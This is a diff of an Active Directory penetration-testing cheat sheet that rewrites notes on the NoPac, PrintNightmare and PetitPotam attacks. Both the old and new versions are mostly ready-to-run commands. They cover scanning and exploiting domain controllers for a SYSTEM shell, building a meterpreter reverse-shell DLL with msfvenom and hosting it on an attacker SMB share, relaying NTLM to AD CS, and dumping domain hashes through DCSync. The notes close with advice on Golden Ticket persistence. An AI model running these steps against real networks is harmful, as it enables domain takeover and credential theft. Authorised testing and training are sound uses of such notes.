@@ -1,126 +1,108 @@
-## NoPac SamAccountName Spoofing
+# Bleeding Edge Vulnerabilities — NoPac / PrintNightmare / PetitPotam
 
-Standard domain user access to a DC unpatched for CVE-2021-42278 and CVE-2021-42287.
-
-Check if target is vulnerable and verify machine account quota
-
-```
-sudo python3 scanner.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
-```
-
-Obtain a semi-interactive SYSTEM shell via smbexec
-
-```
-sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -dc-host <SERVICE_NAME> -shell --impersonate administrator -use-ldap
-```
-
-Perform DCSync using secretsdump to grab domain hashes
-
-```
-sudo python3 noPac.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -dc-host <SERVICE_NAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
-```
-
-- **ms-DS-MachineAccountQuota** set to a value greater than 0.
-    
-- **ms-DS-MachineAccountQuota set to 0** prevents the creation of the required machine account, causing the attack to **fail**.
-    
-- **smbexec.py** behavior is **highly noisy**; it creates services **BTOBTO**/**BTOBO** and writes **execute.bat** to disk, which are easily caught by **Windows Defender** or **EDR**.
-    
-- **smbexec shells** are semi-interactive; you must use **absolute paths** instead of `cd`.
-    
+All three work from standard domain user creds (NoPac, PrintNightmare) or unauthenticated (PetitPotam). All lead to domain compromise.
 
 ---
 
-## PrintNightmare Remote Shell
+## NoPac (CVE-2021-42278 + 42287)
 
-Standard domain user credentials and the Print Spooler service running on a target DC.
+Prerequisite: `ms-DS-MachineAccountQuota` > 0 (default 10). Scan first:
 
-Enumerate RPC to confirm MS-RPRN or MS-PAR exposure
-
-```
-rpcdump.py @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'
+```bash
+sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap
 ```
 
-Generate the DLL payload for the reverse shell
+Get SYSTEM shell on DC as standard domain user:
 
-```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f dll > <FILE_PATH>.dll
-```
-
-Host the payload on an SMB share
-
-```
-sudo smbserver.py -smb2support <SHARE_NAME> <FILE_PATH>
+```bash
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
 ```
 
-Execute the exploit to trigger the DLL load from the attack host share
+> [!warning] Shell is via smbexec — must use full paths, no `cd`. Noisy, likely flagged by Defender. Use `-dump` instead if opsec matters.
 
+DCSync directly via noPac (quieter than shell):
+
+```bash
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
 ```
-sudo python3 CVE-2021-1675.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> '\\<ATTACK_IP>\<SHARE_NAME>\<FILE_PATH>.dll'
-```
 
-> ⚠️ Gap: This exploit specifically requires **cube0x0's version of Impacket**; using the standard library will cause the exploit to **fail**.
-
-- **Print Spooler service crashes** can occur, leading to **service disruption** on the DC.
+Tool saves `.ccache` ticket to disk — use for PTT/DCSync separately if needed. Clean up the ccache after.
 
 ---
 
-## PetitPotam NTLM Relay to AD CS
+## PrintNightmare (CVE-2021-34527 / CVE-2021-1675)
 
-Unauthenticated or authenticated access to a domain where **Active Directory Certificate Services (AD CS)** Web Enrollment is enabled.
+Check if Print Spooler is exposed first:
 
-1. Start the relay to the AD CS Web Enrollment endpoint
-
-```
-sudo ntlmrelayx.py -debug -smb2support --target http://<TARGET_IP>/certsrv/certfnsh.asp --adcs --template DomainController
+```bash
+rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
 ```
 
-2. Coerce the Domain Controller to authenticate to the attack host
+Generate DLL payload, host on SMB share, catch with MSF handler:
 
-```
-python3 PetitPotam.py <ATTACK_IP> <DC_IP>
-```
-
-3. Request a TGT using the Base64 certificate captured by the relay
-
-```
-python3 gettgtpkinit.py <DOMAIN>/<DC_IP>\$ -pfx-base64 <HASH> <FILE_PATH>.ccache
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > <PAYLOAD>.dll
+sudo smbserver.py -smb2support <SHARENAME> /path/to/<PAYLOAD>.dll
 ```
 
-4. Set the Kerberos ticket environment variable
+Run the exploit — target fetches DLL from your share and executes it as SYSTEM:
 
-```
-export KRB5CCNAME=<FILE_PATH>.ccache
-```
-
-5. Perform DCSync using the captured ticket
-
-```
-secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DOMAIN_DC_NAME>
+```bash
+sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<DC_IP> '\\<LHOST>\<SHARENAME>\<PAYLOAD>.dll'
 ```
 
-Coerce authentication from a Windows host
+> [!warning] Can crash the print spooler service. Confirm with client before running. Also: cube0x0's exploit requires cube0x0's fork of Impacket — conflicts with standard Impacket.
+
+---
+
+## PetitPotam (CVE-2021-36942) — Requires AD CS in environment
+
+Coerces DC to authenticate to your host → relay to AD CS Web Enrollment → get DC certificate → DCSync.
+
+Window 1 — start relay, targeting CA Web Enrollment:
+
+```bash
+sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
+```
+
+Window 2 — trigger DC authentication:
+
+```bash
+python3 PetitPotam.py <LHOST> <DC_IP>
+```
+
+ntlmrelayx catches the auth and outputs a base64 certificate blob. Then use it to get a TGT for the DC machine account:
+
+```bash
+python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>$ -pfx-base64 <BASE64_BLOB> dc01.ccache
+export KRB5CCNAME=dc01.ccache
+```
+
+DCSync using the DC's TGT:
+
+```bash
+secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_HOSTNAME>$"@<DC_FQDN>
+```
+
+Alt path — extract NT hash from TGT using PAC (U2U):
+
+```bash
+python /opt/PKINITtools/getnthash.py -key <AS-REP_KEY> <DOMAIN>/<DC_HOSTNAME>$
+secretsdump.py -just-dc-user <DOMAIN>/administrator "<DC_HOSTNAME>$"@<DC_IP> -hashes aad3c435b514a4eeaad3b935b51304fe:<NT_HASH>
+```
+
+From Windows — use base64 cert blob with Rubeus for PTT directly:
+
+```powershell
+.\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<BASE64_BLOB> /ptt
+```
+
+Then DCSync via Mimikatz:
 
 ```
-.\Rubeus.exe asktgt /user:<USERNAME>$ /certificate:<HASH> /ptt
+mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
 ```
 
-Coerce authentication via Mimikatz EFS module
+> [!warning] PetitPotam works unauthenticated. If AD CS is present in the environment, this is a near-automatic path to DA. Check for CA with `certi` if the location isn't known.
 
-```
-mimikatz # misc::efs /server:<DC_IP> /connect:<ATTACK_IP>
-```
-
-- Coercion (Linux) → `PetitPotam.py` → Standard for Linux-based relay attacks.
-    
-- Coercion (Windows) → `Mimikatz` / `Invoke-PetitPotam.ps1` → Use when pivoting through a Windows host.
-    
-- TGT Request → `gettgtpkinit.py` → Prefer on Linux to generate ccache files.
-    
-- TGT Request → `Rubeus` → Prefer on Windows for immediate **Pass-the-Ticket (PTT)**.
-    
-- **CVE-2021-36942 patch** only mitigates unauthenticated coercion; **authenticated users** can often still coerce the DC to authenticate to a relay.
-    
-- **Web Enrollment** must be enabled on the CA host for this specific relay path to work.
-    
-- **AS-REP encryption key** from `gettgtpkinit.py` is required if you intend to recover the NT hash later using `getnthash.py`.
+> [!tip] After getting the DC machine account TGT via PetitPotam/NoPac, grab the `krbtgt` hash via DCSync → Golden Ticket persistence. Grab `administrator` hash → immediate PTH to DA.
